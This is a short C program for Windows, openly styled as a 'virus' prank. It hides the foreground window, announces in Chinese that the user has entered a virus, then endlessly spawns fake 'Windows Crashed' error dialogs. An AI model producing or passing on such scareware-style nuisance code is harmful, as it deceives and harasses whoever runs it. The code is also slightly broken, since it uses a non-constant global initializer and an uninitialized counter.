#include <windows.h>
HWND hwnd=GetForegroundWindow();
int main(void)
{
	ShowWindow(hwnd,SW_HIDE) ;
	MessageBox(NULL,"提示","您已进入此病毒",MB_OK) ;
	for(int i;;i++)
	{
		MessageBox(NULL,"Windows Crashed","Error",MB_ICONERROR | MB_OK) ;
	}
	return 0;
} 
